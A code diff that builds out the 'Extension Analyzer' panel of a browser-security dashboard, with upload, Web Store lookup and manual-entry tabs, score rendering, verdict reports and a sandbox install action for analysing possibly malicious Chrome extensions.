@@ -477,74 +477,857 @@ button{font-family:inherit;cursor:pointer}
   </div>
 </div><!-- /panel-c2 -->
 
-<!-- ─── C1: Extension Analyzer (PLACEHOLDER) ─────────────── -->
+<!-- ─── C1: Extension Analyzer ────────────────────────────── -->
+<style>
+/* ── C1 layout ─────────────────────────────────────────────── */
+#c1-body{flex:1;overflow-y:auto;padding:12px;display:flex;flex-direction:column;gap:10px}
+.c1-card{background:var(--bg2);border:1px solid var(--b1);border-radius:var(--radius-lg);padding:13px 14px}
+.c1-lbl{font-size:9.5px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.06em;margin-bottom:5px}
+.c1-ta{width:100%;background:var(--bg0);border:1px solid var(--b2);border-radius:var(--radius);
+  color:var(--t0);font-size:10.5px;font-family:monospace;padding:7px 9px;resize:vertical;
+  outline:none;line-height:1.5;transition:border-color .15s}
+.c1-ta:focus{border-color:var(--c1)}
+.c1-inp{width:100%;background:var(--bg0);border:1px solid var(--b2);border-radius:var(--radius);
+  color:var(--t0);font-size:10.5px;font-family:monospace;padding:5px 9px;outline:none;height:28px;transition:border-color .15s}
+.c1-inp:focus{border-color:var(--c1)}
+.c1-btn{padding:6px 14px;border-radius:var(--radius);border:none;font-size:11px;font-weight:600;cursor:pointer;transition:all .15s;font-family:inherit}
+.c1-btn.primary{background:var(--c1);color:#fff}.c1-btn.primary:hover{background:#7c3aed}
+.c1-btn.primary:disabled{background:var(--b2);color:var(--t3);cursor:not-allowed}
+.c1-btn.ghost{background:var(--bg3);color:var(--t2);border:1px solid var(--b2)}.c1-btn.ghost:hover{background:var(--b1);color:var(--t0)}
+/* ── Mode tabs ─────────────────────────────────────────────── */
+.c1-tabs{display:flex;border-bottom:1px solid var(--b1);margin-bottom:12px}
+.c1-tab{padding:7px 14px;background:none;border:none;border-bottom:2px solid transparent;
+  color:var(--t2);font-size:11px;font-weight:600;cursor:pointer;font-family:inherit;transition:all .15s}
+.c1-tab:hover{color:var(--t0)}.c1-tab.active{color:var(--c1);border-bottom-color:var(--c1)}
+.c1-pane{display:none}.c1-pane.active{display:block}
+/* ── Drop zone ─────────────────────────────────────────────── */
+#c1-dropzone{border:2px dashed var(--b2);border-radius:var(--radius-lg);padding:28px 20px;
+  text-align:center;cursor:pointer;transition:all .2s;background:var(--bg0)}
+#c1-dropzone.over{border-color:var(--c1);background:var(--c1b)}
+#c1-dropzone:hover{border-color:var(--b3)}
+#c1-dropzone .dz-icon{font-size:32px;margin-bottom:8px;opacity:.5}
+#c1-dropzone .dz-title{font-size:13px;font-weight:600;color:var(--t1);margin-bottom:4px}
+#c1-dropzone .dz-sub{font-size:10.5px;color:var(--t3)}
+#c1-file-input{display:none}
+/* ── Verdict ───────────────────────────────────────────────── */
+.c1-verdict-block{display:flex;align-items:center;gap:14px;margin-bottom:12px}
+.c1-big-score{font-size:44px;font-weight:900;line-height:1;flex-shrink:0}
+.c1-verdict-label{font-size:18px;font-weight:700}
+.c1-verdict-meta{font-size:10px;color:var(--t3);margin-top:3px}
+.c1-verdict-detail{font-size:10.5px;color:var(--t2);margin-top:5px;line-height:1.6}
+/* ── Score bars ────────────────────────────────────────────── */
+.c1-score-row{display:flex;align-items:center;gap:8px;margin-bottom:6px}
+.c1-score-name{font-size:10px;color:var(--t2);width:90px;flex-shrink:0}
+.c1-bar-wrap{flex:1;height:5px;background:var(--b1);border-radius:3px;overflow:hidden}
+.c1-bar{height:100%;border-radius:3px;transition:width .6s ease}
+.c1-score-val{font-size:10px;font-weight:700;width:36px;text-align:right;flex-shrink:0}
+/* ── Flags / signals ───────────────────────────────────────── */
+.c1-flags{display:flex;flex-wrap:wrap;gap:5px;margin-top:8px}
+.c1-flag{font-size:9.5px;font-weight:600;padding:2px 8px;border-radius:4px;
+  background:var(--danger-bg);color:var(--danger);border:1px solid rgba(239,68,68,.25)}
+.c1-flag.info{background:var(--warn-bg);color:var(--warn);border-color:rgba(245,158,11,.25)}
+.c1-signal{font-size:9.5px;font-weight:600;padding:2px 8px;border-radius:4px;
+  background:var(--c1b);color:var(--c1);border:1px solid rgba(139,92,246,.3)}
+/* ── Section badge ─────────────────────────────────────────── */
+.c1-sec{font-size:9px;font-weight:700;padding:2px 8px;border-radius:4px;
+  text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px;display:inline-block}
+.c1-sec.static{background:var(--c2b);color:var(--c2)}
+.c1-sec.dynamic{background:var(--c1b);color:var(--c1)}
+.c1-sandbox-note{font-size:10px;color:var(--t3);padding:7px 10px;
+  background:var(--bg3);border-radius:var(--radius);border:1px solid var(--b2)}
+/* ── History ───────────────────────────────────────────────── */
+.c1-hist-row{display:flex;align-items:center;gap:8px;padding:7px 0;
+  border-bottom:1px solid var(--b1);cursor:pointer}
+.c1-hist-row:last-child{border-bottom:none}
+.c1-hist-row:hover .c1-hist-name{color:var(--t0)}
+.c1-hist-badge{width:28px;height:28px;border-radius:6px;display:flex;align-items:center;
+  justify-content:center;font-size:10px;font-weight:800;flex-shrink:0}
+.c1-hist-badge.safe{background:var(--safe-bg);color:var(--safe)}
+.c1-hist-badge.warn{background:var(--warn-bg);color:var(--warn)}
+.c1-hist-badge.danger{background:var(--danger-bg);color:var(--danger)}
+.c1-hist-name{flex:1;font-size:11px;color:var(--t1);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.c1-hist-src{font-size:9px;color:var(--t3);flex-shrink:0}
+/* ── Spinner ───────────────────────────────────────────────── */
+#c1-spinner{display:none;align-items:center;gap:8px;font-size:11px;color:var(--t2);padding:10px 0}
+@keyframes c1-spin{to{transform:rotate(360deg)}}
+.c1-ring{width:16px;height:16px;border:2px solid var(--b2);
+  border-top-color:var(--c1);border-radius:50%;animation:c1-spin .8s linear infinite;flex-shrink:0}
+#c1-result-area{display:none}
+/* ── Live detection cards ─────────────────────────── */
+.c1-live-card{background:var(--bg0);border:1px solid var(--b2);border-radius:var(--radius-lg);
+  padding:12px 14px;margin-bottom:10px;animation:slideIn .25s ease}
+.c1-live-card.verdict-safe{border-color:rgba(16,185,129,.4)}
+.c1-live-card.verdict-suspicious{border-color:rgba(245,158,11,.4)}
+.c1-live-card.verdict-malicious{border-color:rgba(239,68,68,.4)}
+.c1-lc-hdr{display:flex;align-items:center;gap:10px;margin-bottom:10px}
+.c1-lc-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0;background:var(--c1)}
+.c1-lc-dot.analyzing{background:var(--c1);animation:blink 1.2s infinite}
+.c1-lc-dot.safe{background:var(--safe)}.c1-lc-dot.suspicious{background:var(--warn)}
+.c1-lc-dot.malicious{background:var(--danger)}.c1-lc-dot.error{background:var(--t3)}
+.c1-lc-info{flex:1;min-width:0}
+.c1-lc-title{font-size:11.5px;font-weight:700;color:var(--t0)}
+.c1-lc-extid{font-size:9.5px;font-family:monospace;color:var(--t3);
+  white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.c1-lc-dismiss{background:none;border:none;color:var(--t3);cursor:pointer;
+  font-size:14px;padding:0 4px;line-height:1;flex-shrink:0}
+.c1-lc-dismiss:hover{color:var(--t1)}
+.c1-lc-verdict{display:flex;align-items:center;gap:12px;margin-bottom:10px}
+.c1-lc-score{font-size:32px;font-weight:900;line-height:1;flex-shrink:0}
+.c1-lc-vlabel{font-size:14px;font-weight:700}
+.c1-lc-detail{font-size:10px;color:var(--t2);margin-top:2px}
+.c1-lc-actions{display:flex;gap:7px}
+.c1-lc-actions .c1-btn{padding:5px 12px;font-size:11px}
+</style>
+
 <div class="panel" id="panel-c1">
   <div class="panel-hdr">
     <div class="comp-badge c1">C1</div>
     <div>
       <div class="panel-title">Extension Analyzer</div>
-      <div class="panel-sub">Malicious browser extension detection via ML + sandbox execution</div>
+      <div class="panel-sub">Pre-install threat detection — static ML + dynamic sandbox</div>
     </div>
-    <span class="status-wip">In Development</span>
+    <span class="status-active">Active</span>
   </div>
-  <div class="ph-body">
-    <div class="ph-card">
-      <div class="ph-title">Research Question</div>
-      <div class="ph-text">
-        Can a combination of ML-based static analysis and sandboxed dynamic execution accurately
-        detect malicious browser extensions before they cause harm?
-      </div>
-      <div style="margin-top:10px">
-        <span class="ph-tag c1">Static ML</span>
-        <span class="ph-tag c1">Sandbox Execution</span>
-        <span class="ph-tag c1">JS AST Analysis</span>
-        <span class="ph-tag c1">Behaviour Logging</span>
-      </div>
-    </div>
-    <div class="ph-card">
-      <div class="ph-title">Architecture Pipeline</div>
-      <pre class="arch-pre">Extension Upload
-      |
-      v
-+-------------+    manifest.json + JS source
-| Static      |----------------------------->  ML classifier
-| Analysis    |    permissions, API patterns   (score_static)
-+-------------+
-      |
-      | (if score_static > threshold)
-      v
-+-------------+    Playwright headless Chromium
-| Sandbox     |----------------------------->  Behaviour logger
-| Execution   |    network, DOM, cookie ops    (score_dynamic)
-+-------------+
-      |
-      v
-  Fused verdict (weighted average)</pre>
-    </div>
-    <div class="ph-card">
-      <div class="ph-title">Tech Stack</div>
-      <div class="ph-text">
-        <b>Static:</b> scikit-learn / XGBoost on manifest.json + JS AST features (esprima/acorn)<br>
-        <b>Sandbox:</b> Playwright Chromium with <code style="color:var(--c1)">--load-extension</code><br>
-        <b>Network capture:</b> Playwright route interception / mitmproxy<br>
-        <b>DOM monitoring:</b> MutationObserver injected via CDP
-      </div>
-    </div>
-    <div class="contrib-card">
-      <div class="contrib-title">&#129309; Start Contributing &mdash; C1</div>
-      <ul class="contrib-steps">
-        <li>Fork the repo and create branch <code style="color:var(--c1)">feature/c1-*</code></li>
-        <li>Read <code style="color:var(--c1)">c1/ARCHITECTURE.md</code> for the full spec and integration interface</li>
-        <li>Implement <code style="color:var(--c1)">c1/static_model.py</code> &mdash; feature extraction from manifest + JS AST</li>
-        <li>Implement <code style="color:var(--c1)">c1/sandbox.py</code> &mdash; Playwright sandbox runner with behaviour hooks</li>
-        <li>Wire stubs in <code style="color:var(--c1)">c1/analyzer.py</code> &rarr; <code style="color:var(--c1)">analyze_extension(manifest, source)</code></li>
-        <li>Add <code style="color:var(--c1)">/extension/analyze</code> endpoint in <code style="color:var(--c1)">core/main.py</code></li>
-      </ul>
-      <button class="btn-copy" onclick="copyAiCtx('c1')">&#128203; Copy AI Starter Context</button>
-    </div>
-  </div>
-</div>
 
+  <div id="c1-body">
+
+    <!-- ── Input card ──────────────────────────────────────── -->
+    <div class="c1-card">
+      <div class="c1-tabs">
+        <button class="c1-tab" id="c1-tab-live" onclick="c1Tab('live',this)">
+          &#128308; Live <span id="c1-live-badge" style="display:none;background:var(--danger);
+            color:#fff;font-size:9px;font-weight:700;padding:1px 5px;border-radius:8px;
+            margin-left:4px;vertical-align:middle"></span>
+        </button>
+        <button class="c1-tab active" onclick="c1Tab('upload',this)">&#128229; Upload CRX</button>
+        <button class="c1-tab"        onclick="c1Tab('webstore',this)">&#127760; Web Store</button>
+        <button class="c1-tab"        onclick="c1Tab('manual',this)">&#128196; Manual</button>
+      </div>
+
+      <!-- Tab: Live Analyzer -->
+      <div class="c1-pane" id="c1-pane-live">
+        <div id="c1-live-empty" style="padding:24px 0;text-align:center">
+          <div style="font-size:28px;margin-bottom:8px;opacity:.3">&#128737;&#65039;</div>
+          <div style="font-size:12.5px;font-weight:600;color:var(--t1);margin-bottom:4px">
+            Browser session is being monitored
+          </div>
+          <div style="font-size:11px;color:var(--t3);line-height:1.6">
+            Open the Chrome Web Store in the browser session<br>
+            and click <b style="color:var(--t2)">"Add to Chrome"</b> on any extension to trigger analysis
+          </div>
+          <button class="c1-btn ghost" onclick="c1SimulateClick()"
+            style="margin-top:16px;padding:6px 16px;font-size:11px;opacity:.7"
+            title="Runs the full click-intercept pipeline using the local test extension">
+            &#9654; Simulate Click (Test Pipeline)
+          </button>
+        </div>
+        <div id="c1-live-cards"></div>
+      </div>
+
+      <!-- Tab: Upload CRX -->
+      <div class="c1-pane active" id="c1-pane-upload">
+        <div id="c1-dropzone"
+             onclick="document.getElementById('c1-file-input').click()"
+             ondragover="event.preventDefault();this.classList.add('over')"
+             ondragleave="this.classList.remove('over')"
+             ondrop="c1OnDrop(event)">
+          <div class="dz-icon">&#128193;</div>
+          <div class="dz-title">Drop a .crx file here, or click to browse</div>
+          <div class="dz-sub">The extension file is parsed locally — nothing leaves your machine until you click Analyze</div>
+        </div>
+        <input type="file" id="c1-file-input" accept=".crx" onchange="c1OnFileSelect(event)" />
+        <div id="c1-upload-filename" style="display:none;margin-top:8px;font-size:11px;
+          color:var(--t2);padding:6px 10px;background:var(--bg3);border-radius:var(--radius);
+          border:1px solid var(--b2)">
+          <span id="c1-fname"></span>
+        </div>
+        <div style="margin-top:10px;display:flex;align-items:center;gap:8px">
+          <button class="c1-btn primary" id="c1-upload-btn" onclick="c1UploadAnalyze()" disabled>&#128269; Analyze File</button>
+          <div id="c1-spinner"><div class="c1-ring"></div><span id="c1-spin-label">Analyzing...</span></div>
+        </div>
+      </div>
+
+      <!-- Tab: Web Store URL -->
+      <div class="c1-pane" id="c1-pane-webstore">
+        <div class="c1-lbl">Chrome Web Store URL or Extension ID</div>
+        <input id="c1-ws-input" class="c1-inp" type="text"
+          placeholder="https://chromewebstore.google.com/detail/name/abcdefghijklmnopqrstuvwxyzabcdef" />
+        <div style="font-size:10px;color:var(--t3);margin-top:5px;margin-bottom:10px">
+          Works with both formats: full Web Store URL or just the 32-character extension ID.
+          WebSentinel downloads the extension from Google's servers and analyzes it.
+        </div>
+        <div style="display:flex;align-items:center;gap:8px">
+          <button class="c1-btn primary" id="c1-ws-btn" onclick="c1WebstoreAnalyze()">&#128269; Check Extension</button>
+          <div id="c1-ws-spinner" style="display:none;align-items:center;gap:8px;font-size:11px;color:var(--t2)">
+            <div class="c1-ring"></div><span>Downloading from Chrome Web Store...</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Tab: Manual -->
+      <div class="c1-pane" id="c1-pane-manual">
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:8px">
+          <div>
+            <div class="c1-lbl">manifest.json <span style="color:var(--danger)">*</span></div>
+            <textarea id="c1-manifest" class="c1-ta" rows="6" placeholder='{"permissions":["tabs","cookies"],...}'></textarea>
+          </div>
+          <div>
+            <div class="c1-lbl">JavaScript source (optional)</div>
+            <textarea id="c1-source" class="c1-ta" rows="6" placeholder="Paste concatenated JS source..."></textarea>
+          </div>
+        </div>
+        <div style="display:flex;gap:8px;margin-bottom:8px">
+          <div style="flex:1">
+            <div class="c1-lbl">Extension ID (optional)</div>
+            <input id="c1-extid" class="c1-inp" type="text" placeholder="hdokiejnpimakedhajhdlcegeplioahd" />
+          </div>
+          <div style="flex:1">
+            <div class="c1-lbl">Unpacked folder path (optional — triggers sandbox)</div>
+            <input id="c1-extpath" class="c1-inp" type="text" placeholder="C:\Extensions\my_ext\" />
+          </div>
+        </div>
+        <div style="display:flex;align-items:center;gap:8px">
+          <button class="c1-btn primary" id="c1-submit-btn" onclick="c1Analyze()">&#128269; Analyze</button>
+          <button class="c1-btn ghost" onclick="c1FillMalicious()">Try malicious example</button>
+          <button class="c1-btn ghost" onclick="c1ClearManual()">Clear</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── Result card ─────────────────────────────────────── -->
+    <div id="c1-result-area">
+      <div class="c1-card">
+        <div class="c1-verdict-block">
+          <div id="c1-big-score" class="c1-big-score">--</div>
+          <div>
+            <div id="c1-verdict-label" class="c1-verdict-label">--</div>
+            <div id="c1-verdict-meta"  class="c1-verdict-meta"></div>
+            <div id="c1-verdict-detail" class="c1-verdict-detail"></div>
+          </div>
+        </div>
+        <div class="c1-score-row">
+          <div class="c1-score-name">Final score</div>
+          <div class="c1-bar-wrap"><div id="c1-bar-final" class="c1-bar" style="width:0%"></div></div>
+          <div id="c1-val-final" class="c1-score-val">0</div>
+        </div>
+        <div class="c1-score-row">
+          <div class="c1-score-name">Static (ML)</div>
+          <div class="c1-bar-wrap"><div id="c1-bar-static" class="c1-bar" style="width:0%;background:var(--c2)"></div></div>
+          <div id="c1-val-static" class="c1-score-val">0</div>
+        </div>
+        <div class="c1-score-row">
+          <div class="c1-score-name">Dynamic sandbox</div>
+          <div class="c1-bar-wrap"><div id="c1-bar-dynamic" class="c1-bar" style="width:0%;background:var(--c1)"></div></div>
+          <div id="c1-val-dynamic" class="c1-score-val">0</div>
+        </div>
+        <div id="c1-flags" class="c1-flags"></div>
+
+        <!-- Install into Browser action bar -->
+        <div id="c1-install-bar" style="display:none;margin-top:12px;padding-top:12px;
+             border-top:1px solid var(--b1);display:flex;align-items:center;gap:8px;flex-wrap:wrap">
+          <button id="c1-install-btn" class="c1-btn primary" onclick="c1InstallIntoBrowser()">
+            &#128640; Install into Browser
+          </button>
+          <span style="font-size:10px;color:var(--t3)">
+            Downloads the extension directly and loads it into the live browser session
+          </span>
+          <div id="c1-install-spinner" style="display:none;align-items:center;gap:6px;font-size:10.5px;color:var(--t2)">
+            <div class="c1-ring"></div><span id="c1-install-status">Installing...</span>
+          </div>
+        </div>
+      </div>
+
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:10px">
+        <div class="c1-card">
+          <span class="c1-sec static">Static Analysis</span>
+          <div id="c1-static-detail" style="font-size:10.5px;color:var(--t2);line-height:1.7"></div>
+        </div>
+        <div class="c1-card">
+          <span class="c1-sec dynamic">Dynamic Sandbox</span>
+          <div id="c1-dynamic-detail" style="font-size:10.5px;color:var(--t2);line-height:1.7"></div>
+        </div>
+      </div>
+
+      <!-- Verdict Report card -->
+      <div class="c1-card" id="c1-report-card" style="display:none;margin-top:10px">
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px">
+          <span class="c1-sec" style="background:var(--b2);color:var(--t1)">Verdict Report</span>
+          <span id="c1-risk-badge" style="font-size:9px;font-weight:700;padding:2px 7px;border-radius:4px;letter-spacing:.5px"></span>
+        </div>
+        <p id="c1-report-summary" style="font-size:11px;color:var(--t1);line-height:1.6;margin:0 0 10px"></p>
+        <div id="c1-report-formula" style="font-size:10px;color:var(--t3);font-family:monospace;margin-bottom:10px;padding:5px 8px;background:var(--b2);border-radius:4px"></div>
+        <div id="c1-report-flags" style="display:flex;flex-direction:column;gap:5px;margin-bottom:10px"></div>
+        <div id="c1-report-recommendation" style="font-size:10.5px;font-style:italic;color:var(--t2);border-top:1px solid var(--b1);padding-top:8px"></div>
+      </div>
+    </div>
+
+    <!-- ── Recent analyses ─────────────────────────────────── -->
+    <div class="c1-card" id="c1-history-card" style="display:none">
+      <div style="font-size:11px;font-weight:700;color:var(--t0);margin-bottom:10px">Recent analyses</div>
+      <div id="c1-history-list"></div>
+    </div>
+
+  </div><!-- /c1-body -->
+</div><!-- /panel-c1 -->
+
+<script>
+// ── C1 tab switching ───────────────────────────────────────────────────────
+function c1Tab(name, btn) {
+  document.querySelectorAll('.c1-pane').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.c1-tab').forEach(b => b.classList.remove('active'));
+  document.getElementById('c1-pane-' + name).classList.add('active');
+  btn.classList.add('active');
+}
+
+// ── Score / color helpers ─────────────────────────────────────────────────
+function c1Color(score) {
+  if (score >= 70) return '#ef4444';
+  if (score >= 40) return '#f59e0b';
+  return '#10b981';
+}
+function c1BadgeClass(score) {
+  if (score >= 70) return 'danger';
+  if (score >= 40) return 'warn';
+  return 'safe';
+}
+
+// ── Render verdict result ─────────────────────────────────────────────────
+function c1Render(data) {
+  const finalScore = Math.round(data.score * 100);
+  const verdict    = (data.verdict || 'UNKNOWN').toUpperCase();
+  const staticPct  = Math.round((data.static?.score  || 0) * 100);
+  const dynPct     = Math.round((data.dynamic?.score || 0) * 100);
+  const clr        = c1Color(finalScore);
+
+  document.getElementById('c1-big-score').textContent    = finalScore;
+  document.getElementById('c1-big-score').style.color    = clr;
+  document.getElementById('c1-verdict-label').textContent = verdict;
+  document.getElementById('c1-verdict-label').style.color = clr;
+
+  const meta = [
+    data.source === 'upload'        ? 'Source: uploaded CRX' : '',
+    data.source === 'webstore'      ? 'Source: Chrome Web Store' : '',
+    data.source === 'webstore_auto' ? 'Source: auto-detected' : '',
+    data.webstore_url               ? '' : '',
+    data.filename                   ? 'File: ' + data.filename : '',
+    data.timestamp                  ? new Date(data.timestamp).toLocaleTimeString() : '',
+  ].filter(Boolean).join(' · ');
+  document.getElementById('c1-verdict-meta').textContent   = meta;
+  document.getElementById('c1-verdict-detail').textContent = data.detail || '';
+
+  const setBar = (id, val, clrOverride) => {
+    const el = document.getElementById(id);
+    el.style.width      = val + '%';
+    el.style.background = clrOverride || c1Color(val);
+  };
+  setBar('c1-bar-final',   finalScore);
+  setBar('c1-bar-static',  staticPct, '#3b82f6');
+  setBar('c1-bar-dynamic', dynPct,    '#8b5cf6');
+  document.getElementById('c1-val-final').textContent   = finalScore;
+  document.getElementById('c1-val-static').textContent  = staticPct;
+  document.getElementById('c1-val-dynamic').textContent = dynPct;
+
+  const flagsEl = document.getElementById('c1-flags');
+  flagsEl.innerHTML = '';
+  (data.flags || []).forEach(f => {
+    const chip = document.createElement('span');
+    chip.className = 'c1-flag' + (f.includes('SANDBOX') || f.includes('SKIP') ? ' info' : '');
+    chip.textContent = f;
+    flagsEl.appendChild(chip);
+  });
+
+  const st = data.static || {};
+  document.getElementById('c1-static-detail').innerHTML =
+    `<b>ML probability:</b> ${((st.ml_score||0)*100).toFixed(1)}%<br>` +
+    `<b>Hash match:</b> ${st.hash_match
+      ? '<span style="color:var(--danger)">YES — known malicious ID</span>'
+      : 'No'}<br>` +
+    `<b>Static score:</b> ${staticPct}/100`;
+
+  const dy = data.dynamic || {};
+  const signals = dy.signals || [];
+  let dynHtml = dy.executed
+    ? `<b>Sandbox executed:</b> <span style="color:var(--safe)">Yes</span><br><b>Dynamic score:</b> ${dynPct}/100<br>`
+    : `<b>Sandbox:</b> <span style="color:var(--t3)">Not executed</span><br>
+       <div class="c1-sandbox-note" style="margin-top:6px">
+         Sandbox triggers automatically when static score &gt; 50 and an unpacked extension path is available.
+       </div>`;
+  if (signals.length) {
+    dynHtml += '<div class="c1-flags" style="margin-top:6px">';
+    signals.forEach(s => { dynHtml += `<span class="c1-signal">${s}</span>`; });
+    dynHtml += '</div>';
+  }
+  document.getElementById('c1-dynamic-detail').innerHTML = dynHtml;
+  document.getElementById('c1-result-area').style.display = 'block';
+
+  // ── Verdict Report card ──────────────────────────────────────────────────
+  const rpt = data.report;
+  const reportCard = document.getElementById('c1-report-card');
+  if (rpt && rpt.summary) {
+    reportCard.style.display = 'block';
+
+    const riskColors = { CRITICAL: '#ef4444', HIGH: '#f59e0b', MEDIUM: '#3b82f6', LOW: '#10b981' };
+    const badge = document.getElementById('c1-risk-badge');
+    badge.textContent = rpt.risk_level || '';
+    badge.style.background = (riskColors[rpt.risk_level] || '#6b7280') + '22';
+    badge.style.color = riskColors[rpt.risk_level] || '#6b7280';
+    badge.style.border = '1px solid ' + (riskColors[rpt.risk_level] || '#6b7280') + '55';
+
+    document.getElementById('c1-report-summary').textContent = rpt.summary || '';
+
+    const sb = rpt.score_breakdown || {};
+    document.getElementById('c1-report-formula').textContent =
+      'Score formula: ' + (sb.formula || '');
+
+    const flagsDiv = document.getElementById('c1-report-flags');
+    flagsDiv.innerHTML = '';
+    (rpt.flags || []).forEach(f => {
+      const sevClr = { CRITICAL: '#ef4444', HIGH: '#f59e0b', MEDIUM: '#3b82f6', LOW: '#6b7280' };
+      const clr = sevClr[f.severity] || '#6b7280';
+      flagsDiv.innerHTML +=
+        `<div style="padding:6px 8px;border-radius:5px;background:var(--b2);border-left:3px solid ${clr}">` +
+          `<div style="display:flex;align-items:center;gap:6px;margin-bottom:2px">` +
+            `<span style="font-size:9px;font-weight:700;color:${clr};letter-spacing:.4px">${f.severity}</span>` +
+            `<span style="font-size:10px;font-weight:600;color:var(--t1)">${f.flag}</span>` +
+          `</div>` +
+          `<div style="font-size:10px;color:var(--t3);line-height:1.5">${f.description}</div>` +
+        `</div>`;
+    });
+
+    document.getElementById('c1-report-recommendation').textContent =
+      rpt.recommendation ? ('Recommendation: ' + rpt.recommendation) : '';
+  } else {
+    reportCard.style.display = 'none';
+  }
+
+  // Show "Install into Browser" button when the result came from a Web Store lookup
+  // (we have the extension ID so we can download + install it)
+  const installBar = document.getElementById('c1-install-bar');
+  const hasExtId = data.extension_id ||
+    (data.webstore_url && data.webstore_url.length > 10) ||
+    (data.source === 'webstore' || data.source === 'webstore_auto');
+  installBar.style.display = hasExtId ? 'flex' : 'none';
+  // Store the extension ID / URL on the button for the install handler
+  installBar.dataset.extId = data.extension_id || '';
+  installBar.dataset.wsUrl  = data.webstore_url  || '';
+  // Dim the button if malicious (user can still force-install for research)
+  const btn = document.getElementById('c1-install-btn');
+  if (data.verdict === 'MALICIOUS') {
+    btn.style.background = 'var(--danger)';
+    btn.title = 'Extension is MALICIOUS — click to force-install for research purposes';
+    btn.textContent = '⚠️ Force Install (MALICIOUS)';
+  } else {
+    btn.style.background = '';
+    btn.title = '';
+    btn.textContent = '🚀 Install into Browser';
+  }
+}
+
+// ── Install extension into live Playwright session ────────────────────────
+async function c1InstallIntoBrowser() {
+  const bar     = document.getElementById('c1-install-bar');
+  const extId   = bar.dataset.extId;
+  const wsUrl   = bar.dataset.wsUrl;
+  const payload = extId || wsUrl;
+  if (!payload) { alert('No extension ID available for installation.'); return; }
+
+  const btn  = document.getElementById('c1-install-btn');
+  const spin = document.getElementById('c1-install-spinner');
+  const stat = document.getElementById('c1-install-status');
+  btn.disabled = true;
+  spin.style.display = 'flex';
+  stat.textContent = 'Downloading from Chrome Web Store...';
+
+  try {
+    const isMal = btn.textContent.includes('MALICIOUS');
+    const res = await fetch(API + '/session/install_extension', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ url_or_id: payload, force: isMal }),
+    });
+    const data = await res.json();
+
+    if (data.status === 'blocked') {
+      alert('Installation blocked: ' + data.reason +
+            '\n\nClick "Force Install" if you want to load it anyway for research.');
+      btn.textContent = '⚠️ Force Install (MALICIOUS)';
+      btn.style.background = 'var(--danger)';
+    } else if (data.status === 'installed') {
+      stat.textContent = 'Installed! Browser is reloading...';
+      showToast('✅ Extension installed into browser session');
+      btn.textContent = '✅ Installed';
+      btn.style.background = 'var(--safe)';
+    } else if (data.status === 'ready') {
+      showToast('Extension ready — start the browser session to load it');
+      btn.textContent = '⏳ Start session to load';
+    } else {
+      alert('Unexpected response: ' + JSON.stringify(data));
+    }
+  } catch (err) {
+    alert('Install failed: ' + err.message);
+    btn.disabled = false;
+  } finally {
+    spin.style.display = 'none';
+  }
+}
+
+// ── WebSocket: extension installed notification ───────────────────────────
+function c1HandleInstallMsg(msg) {
+  if (msg.type === 'c1_extension_installed') {
+    showToast('Extension loaded into browser: ' + msg.extension_id);
+  }
+}
+
+// ── History list ──────────────────────────────────────────────────────────
+function c1AddHistory(data) {
+  const card = document.getElementById('c1-history-card');
+  const list = document.getElementById('c1-history-list');
+  card.style.display = 'block';
+  const score   = Math.round(data.score * 100);
+  const verdict = (data.verdict || '').toUpperCase();
+  const name    = (data.filename || (data.webstore_url
+    ? data.webstore_url.replace(/.*detail\//,'').split('/')[0]
+    : (data.extension_id || ('score/' + score)))).slice(0, 45);
+  const src     = {'upload':'CRX','webstore':'Store','webstore_intercept':'Live',
+                   'webstore_auto':'Auto','manual':'Manual',
+                   'simulated_click':'Sim'}[data.source] || data.source || '?';
+  const ts      = data.timestamp ? new Date(data.timestamp).toLocaleTimeString() : '';
+  const summary = data.report?.summary ? data.report.summary.slice(0, 90) + '…' : '';
+
+  const row = document.createElement('div');
+  row.className = 'c1-hist-row';
+  row.title = summary;
+  row.innerHTML =
+    `<div class="c1-hist-badge ${c1BadgeClass(score)}">${score}</div>` +
+    `<div style="flex:1;min-width:0">` +
+      `<div class="c1-hist-name">${name}</div>` +
+      `<div style="font-size:9px;color:var(--t3);margin-top:1px">${ts}</div>` +
+    `</div>` +
+    `<div style="display:flex;flex-direction:column;align-items:flex-end;gap:2px">` +
+      `<div class="c1-hist-src">${src}</div>` +
+      `<div style="font-size:9px;font-weight:700;color:${c1Color(score)}">${verdict}</div>` +
+    `</div>`;
+  row.onclick = () => c1Render(data);
+  list.insertBefore(row, list.firstChild);
+  if (list.children.length > 8) list.removeChild(list.lastChild);
+}
+
+// ── CRX file upload (drag-and-drop) ──────────────────────────────────────
+let _c1UploadFile = null;
+
+function c1OnDrop(e) {
+  e.preventDefault();
+  document.getElementById('c1-dropzone').classList.remove('over');
+  const f = e.dataTransfer.files[0];
+  if (f) c1SetFile(f);
+}
+
+function c1OnFileSelect(e) {
+  const f = e.target.files[0];
+  if (f) c1SetFile(f);
+}
+
+function c1SetFile(f) {
+  if (!f.name.toLowerCase().endsWith('.crx')) {
+    alert('Please select a .crx file.'); return;
+  }
+  _c1UploadFile = f;
+  document.getElementById('c1-fname').textContent = f.name + '  (' + (f.size/1024).toFixed(1) + ' KB)';
+  document.getElementById('c1-upload-filename').style.display = 'block';
+  document.getElementById('c1-upload-btn').disabled = false;
+}
+
+async function c1UploadAnalyze() {
+  if (!_c1UploadFile) return;
+  const btn  = document.getElementById('c1-upload-btn');
+  const spin = document.getElementById('c1-spinner');
+  btn.disabled = true;
+  spin.style.display = 'flex';
+  document.getElementById('c1-result-area').style.display = 'none';
+  const fd = new FormData();
+  fd.append('file', _c1UploadFile);
+  try {
+    const res  = await fetch(API + '/extension/upload', { method: 'POST', body: fd });
+    if (!res.ok) throw new Error(`HTTP ${res.status}: ${await res.text()}`);
+    const data = await res.json();
+    c1Render(data);
+    c1AddHistory(data);
+  } catch (err) {
+    alert('Upload failed: ' + err.message);
+  } finally {
+    btn.disabled = (_c1UploadFile === null);
+    spin.style.display = 'none';
+  }
+}
+
